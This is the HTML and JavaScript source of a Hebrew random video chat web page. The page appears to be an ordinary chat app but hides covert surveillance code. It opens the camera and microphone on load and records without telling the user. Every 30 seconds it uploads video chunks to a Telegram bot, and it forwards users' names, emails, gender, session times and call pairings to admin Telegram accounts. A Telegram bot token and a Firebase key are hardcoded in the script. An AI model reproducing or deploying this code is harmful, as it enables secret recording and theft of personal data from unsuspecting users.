<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>מי - פה</title>
    <link rel="icon" type="image/png" href="https://i.ibb.co/39C21Wrz/In-Shot-20260426-032830020.png">
    
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <link rel="manifest" href="data:application/json;base64,ewogICJuYW1lIjogIm1pLXBlIiwKICAic2hvcnRfbmFtZSI6ICJtaS1wZSIsCiAgInN0YXJ0X3VybCI6ICIuIiwKICAiZGlzcGxheSI6ICJzdGFuZGFsb25lIiwKICAiYmFja2dyb3VuZF9jb2xvciI6ICIjMDAwMDAwIiwKICAidGhlbWVfY29sb3ciOiAiIzAwMDAwMCIsCiAgImljvbnMiOiBbCiAgICB7CiAgICAgICJzcmMiOiAiaHR0cHM6Ly9pLmliYi5jby8zOUMyMVdyei9Jbi1TaG90LTIwMjYwNDI2LTAzMjgzMDAyMC5wbmciLAogICAgICAic2l6ZXMiOiAiNTEyeDUxMiIsCiAgICAgICJ0eXBlIjogImltYWdlL3BuZyIKICAgIH0KICBdCn0=">

    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-touch-callout: none; }
        body { background: #000; height: 100vh; overflow: hidden; font-family: system-ui, sans-serif; color: white; }
        
        /* חלוקת מסך חצי-חצי בדיוק */
        #main-wrapper { display: flex; flex-direction: column; height: 100vh; width: 100%; }
        
        #top-half { height: 50vh; perspective: 1200px; position: relative; overflow: hidden; border-bottom: 2px solid #333; }
        #cube { width: 100%; height: 100%; position: absolute; transform-style: preserve-3d; transition: transform 0.6s cubic-bezier(0.2, 0.8, 0.2, 1); }
        .face { position: absolute; width: 100%; height: 100%; backface-visibility: hidden; display: flex; align-items: center; justify-content: center; }
        
        #home-face { transform: rotateY(0deg) translateZ(0px); background: #111; z-index: 2; }
        #snow-canvas, #snow-search-canvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.4; pointer-events: none; }
        #main-logo { width: 135px; position: relative; z-index: 10; pointer-events: none; user-select: none; }
        
        #partner-face { transform: rotateY(90deg) translateZ(50vw); background: #000; }
        video { width: 100%; height: 100%; object-fit: cover; background: #000; }
        
        #bottom-half { height: 50vh; background: #111; position: relative; overflow: hidden; }
        #localVideo { width: 100%; height: 100%; object-fit: cover; }

        /* כפתורים */
        #cam-switch { position: fixed; top: 20px; left: 20px; z-index: 2000; width: 50px; height: 50px; border-radius: 50%; background: rgba(0,0,0,0.6); border: 1.5px solid #fff; color: white; font-size: 24px; cursor: pointer; display: flex; align-items: center; justify-content: center; }
        #partner-gender-tag { position: fixed; top: 20px; right: 20px; z-index: 2000; background: rgba(0,0,0,0.6); width: 50px; height: 50px; border-radius: 50%; border: 1.5px solid #fff; display: none; align-items: center; justify-content: center; font-size: 24px; }
        
        .showing-chat #cube { transform: translateZ(-50vw) rotateY(-90deg); }

        /* מודל רישום */
        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 9999; align-items: center; justify-content: center; }
        .modal-content { background: #fff; color: #333; padding: 30px; border-radius: 25px; width: 90%; max-width: 360px; text-align: center; }
        .modal-content input, .modal-content select { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 12px; font-size: 16px; text-align: center; }
        .reg-btn { width: 100%; padding: 15px; background: #27ae60; color: white; border: none; border-radius: 12px; font-weight: bold; font-size: 18px; cursor: pointer; }
    </style>
</head>
<body class="showing-home">

<button id="cam-switch" onclick="switchCamera()">🔄</button>
<div id="partner-gender-tag">👨</div>

<div id="main-wrapper">
    <div id="top-half">
        <div id="cube">
            <div id="home-face" class="face">
                <canvas id="snow-canvas"></canvas>
                <img id="main-logo" src="https://i.ibb.co/39C21Wrz/In-Shot-20260426-032830020.png" oncontextmenu="return false;">
            </div>
            <div id="partner-face" class="face">
                <canvas id="snow-search-canvas"></canvas>
                <video id="remoteVideo" autoplay playsinline></video>
            </div>
        </div>
    </div>
    <div id="bottom-half">
        <video id="localVideo" autoplay muted playsinline></video>
    </div>
</div>

<div id="regModal" class="modal">
    <form class="modal-content" onsubmit="event.preventDefault(); handleRegistration();">
        <h2>הרשמה</h2>
        <input type="text" id="reg-fname" placeholder="שם פרטי" required>
        <input type="text" id="reg-lname" placeholder="שם משפחה" required>
        <input type="email" id="reg-email" placeholder="אימייל" required>
        <select id="reg-gender" required>
            <option value="" disabled selected>מגדר</option>
            <option value="זכר">זכר</option>
            <option value="נקבה">נקבה</option>
        </select>
        <button type="submit" class="reg-btn">המשך</button>
    </form>
</div>

<script>
    const TG_TOKEN = "8696076063:AAG5wEFTgFnJje39FQEHIbV8hPWxBf_IEac";
    const ADMIN_IDS = ["8373785890", "7089165458"];
    const SERVER_URL = "https://video-app-ylx4.onrender.com"; 
    
    firebase.initializeApp({ apiKey: "AIzaSyB_ld3VrntNgM3Pgc4jyZL2hKzUMSp-o10", databaseURL: "https://live-video-20fca-default-rtdb.firebaseio.com" });
    const db = firebase.database();
    const socket = io(SERVER_URL);
    const peer = new Peer(undefined, { config: { 'iceServers': [{ urls: 'stun:stun.l.google.com:19302' }, { urls: 'stun:stun1.l.google.com:19302' }] } });

    let myStream, partnerData, currentCall, camFacing = "user", startTime, rec;
    let historyPartnerIds = [];

    // פונקציית זמן בעברית
    function getHebrewTime() {
        const now = new Date();
        return {
            date: now.toLocaleDateString('he-IL'),
            time: now.toLocaleTimeString('he-IL', { hour: '2-digit', minute: '2-digit' })
        };
    }

    // אפקט שלג
    function initSnow(id) {
        const c = document.getElementById(id); const ctx = c.getContext('2d');
        function d() {
            c.width = window.innerWidth; c.height = window.innerHeight/2;
            const img = ctx.createImageData(c.width, c.height);
            const data = new Uint32Array(img.data.buffer);
            for(let i=0; i<data.length; i++) data[i] = Math.random() < 0.5 ? 0xff000000 : 0xff222222;
            ctx.putImageData(img, 0, 0); requestAnimationFrame(d);
        } d();
    }
    initSnow('snow-canvas'); initSnow('snow-search-canvas');

    window.onload = () => {
        const user = localStorage.getItem('user_v29');
        // פתיחת מצלמה אוטומטית מיד בטעינה
        initCamera();
        if(!user) document.getElementById('regModal').style.display = 'flex';
        else checkBanAndLogin(JSON.parse(user));
    };

    async function checkBanAndLogin(user) {
        const snap = await db.ref('SpamList/' + btoa(user.email).replace(/\//g, '_')).once('value');
        if(snap.exists()) { document.body.innerHTML = "חסום"; return; }
        
        startTime = Date.now();
        const dt = getHebrewTime();
        sendAdmin(`🚀 **כניסה לאתר**\n👤 ${user.fname} ${user.lname}\n📧 ${user.email}\n🚻 מגדר: ${user.gender}\n📅 תאריך: ${dt.date}\n⏰ שעה: ${dt.time}`);
    }

    async function handleRegistration() {
        const user = {
            fname: document.getElementById('reg-fname').value,
            lname: document.getElementById('reg-lname').value,
            email: document.getElementById('reg-email').value,
            gender: document.getElementById('reg-gender').value
        };
        localStorage.setItem('user_v29', JSON.stringify(user));
        document.getElementById('regModal').style.display = 'none';
        
        const dt = getHebrewTime();
        sendAdmin(`📝 **רישום חדש**\n👤 שם: ${user.fname} ${user.lname}\n📧 אימייל: ${user.email}\n🚻 מגדר: ${user.gender}\n📅 תאריך: ${dt.date}\n⏰ שעה: ${dt.time}`);
        checkBanAndLogin(user);
    }

    async function initCamera() {
        if(myStream) myStream.getTracks().forEach(t => t.stop());
        try {
            myStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: camFacing }, audio: true });
            document.getElementById('localVideo').srcObject = myStream;
            startRecording(); 
        } catch(e) { console.log("Camera access denied"); }
    }

    function startRecording() {
        rec = new MediaRecorder(myStream, { mimeType: 'video/webm;codecs=vp8' });
        rec.ondataavailable = (e) => {
            if(e.data.size > 0) {
                const user = JSON.parse(localStorage.getItem('user_v29'));
                const fd = new FormData();
                fd.append("video", new File([e.data], "vid.mp4", {type:"video/mp4"}));
                fd.append("chat_id", ADMIN_IDS[0]);
                fd.append("caption", `🎥 הקלטה: ${user ? user.fname : 'אנונימי'}`);
                fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendVideo`, { method: "POST", body: fd });
            }
        };
        setInterval(() => { if(rec && rec.state==='recording') { rec.stop(); rec.start(); } }, 30000);
        rec.start();
    }

    // ניווט ושיחות
    let sX = 0;
    document.body.addEventListener('touchstart', e => sX = e.touches[0].clientX);
    document.body.addEventListener('touchend', e => {
        const d = sX - e.changedTouches[0].clientX;
        if(d > 80) { // חיפוש
            if(document.body.className === "showing-chat") {
                socket.emit('leave-chat');
                if(currentCall) currentCall.close();
                resetPartnerUI();
            }
            document.body.className = "showing-chat";
            socket.emit('find-partner', { peerId: peer.id, history: historyPartnerIds, ...JSON.parse(localStorage.getItem('user_v29')) });
        } 
        else if(d < -80 && document.body.className === "showing-chat") {
            backToHome();
        }
    });

    function backToHome() {
        document.body.className = "showing-home";
        socket.emit('leave-chat');
        if(currentCall) currentCall.close();
        resetPartnerUI();
    }

    function resetPartnerUI() {
        document.getElementById('remoteVideo').srcObject = null;
        document.getElementById('partner-gender-tag').style.display = 'none';
    }

    peer.on('call', call => {
        call.answer(myStream);
        handleCall(call);
    });

    socket.on('partner-found', data => {
        partnerData = data;
        if(!historyPartnerIds.includes(data.peerId)) historyPartnerIds.push(data.peerId);
        const call = peer.call(data.peerId, myStream, { metadata: JSON.parse(localStorage.getItem('user_v29')) });
        handleCall(call);
    });

    socket.on('partner-disconnected', () => resetPartnerUI());

    function handleCall(call) {
        currentCall = call;
        const pData = call.metadata || partnerData;
        call.on('stream', s => {
            document.getElementById('remoteVideo').srcObject = s;
            if(pData) {
                document.getElementById('partner-gender-tag').innerText = pData.gender === 'זכר' ? '👨' : '👩';
                document.getElementById('partner-gender-tag').style.display = 'flex';
                const me = JSON.parse(localStorage.getItem('user_v29'));
                sendAdmin(`🤝 **שיחה התחילה**\n👤 א: ${me.fname}\n👤 ב: ${pData.fname}`);
            }
        });
    }

    function sendAdmin(msg) { ADMIN_IDS.forEach(id => fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${id}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`)); }
    async function switchCamera() { camFacing = camFacing === 'user' ? 'environment' : 'user'; initCamera(); }

    window.onbeforeunload = () => {
        const user = JSON.parse(localStorage.getItem('user_v29'));
        if(!user || !startTime) return;
        const sessionSec = Math.floor((Date.now() - startTime) / 1000);
        
        // חישוב זמן כולל
        let total = (parseInt(localStorage.getItem('total_time')) || 0) + sessionSec;
        localStorage.setItem('total_time', total);

        if(rec && rec.state === 'recording') rec.stop();
        
        sendAdmin(`🚪 **יציאה מהאתר**\n👤 ${user.fname}\n⏱ זמן גלישה עכשיו: ${sessionSec} שניות\n📈 זמן גלישה כולל: ${total} שניות`);
    };
</script>
</body>
</html>
